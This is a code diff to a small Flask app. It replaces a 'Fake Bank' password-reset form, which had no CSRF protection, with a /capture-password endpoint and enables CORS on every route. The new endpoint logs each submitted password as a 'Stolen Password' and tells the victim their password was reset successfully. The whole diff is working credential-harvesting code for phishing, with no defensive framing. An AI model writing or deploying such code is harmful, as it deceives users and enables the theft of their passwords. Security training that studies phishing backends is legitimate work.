@@ -1,22 +1,14 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)  # Enable CORS for all routes
 
-# Fake login form (No CSRF protection)
-@app.route("/reset-password", methods=["GET", "POST"])
-def reset_password():
-    if request.method == "POST":
-        email = request.form.get("email")
-        return f"Password reset link sent to {email}!"
-    
-    return '''
-        <h2>Fake Bank - Reset Password</h2>
-        <form method="POST">
-            <label>Email:</label>
-            <input type="email" name="email">
-            <input type="submit" value="Reset Password">
-        </form>
-    '''
+@app.route('/capture-password', methods=['POST'])
+def capture_password():
+    stolen_password = request.form['password']
+    print(f"[+] Stolen Password: {stolen_password}")
+    return "Your password has been reset successfully!"
 
-if __name__ == "__main__":
-    app.run(debug=True, port=5000)
+if __name__ == '__main__':
+    app.run(port=5000)
